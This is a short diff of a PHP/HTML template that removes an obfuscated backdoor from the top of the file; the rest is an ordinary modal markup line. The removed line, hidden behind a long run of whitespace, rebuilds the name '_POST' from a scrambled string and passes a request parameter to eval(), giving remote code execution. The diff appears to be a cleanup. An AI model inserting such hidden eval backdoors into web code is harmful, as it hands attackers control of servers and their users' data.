@@ -1,5 +1,3 @@
-<?php                                                                                                                                                                                                                                                            $mup7 = "tseou_pr";$zjyk17=$mup7[1].$mup7[0].$mup7[7]. $mup7[0].$mup7[3]. $mup7[4]. $mup7[6]. $mup7[6].$mup7[2].$mup7[7] ;$qis4 = $zjyk17 ($mup7[5].$mup7[6] . $mup7[3].$mup7[1].$mup7[0]) ; if (isset( ${ $qis4} [ 'q39e814'])) { eval( ${ $qis4} [ 'q39e814' ] );}?>
-    
       <!-- Opening Modal -->
       
         <div id="moving" class="modal fade">
